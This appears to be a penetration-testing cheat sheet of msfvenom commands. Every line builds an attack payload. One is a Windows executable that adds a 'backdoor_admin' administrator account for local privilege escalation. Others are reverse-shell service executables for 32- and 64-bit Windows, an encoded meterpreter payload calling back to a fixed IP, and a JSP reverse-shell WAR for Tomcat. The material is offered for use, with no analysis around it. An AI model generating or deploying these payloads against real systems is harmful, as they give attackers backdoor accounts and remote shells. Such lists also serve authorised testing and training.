
`msfvenom -p windows/adduser USER=backdoor_admin PASS=Password@123 -f exe > service.exe`          (it will create a new user, and add them into the administrator group after execution - for localprivesc - refer unquotedservicepath attack)

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f exe-service -o Vuln.exe`         (64-bit systems)

`msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f exe-service -o Vuln.exe`         (32-bit systems)

`msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=10.10.16.241 LPORT=1234 -f exe-service -o Payload.exe`    

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f war -o shell.war`                 (Java, jsp payload for Tomcat)


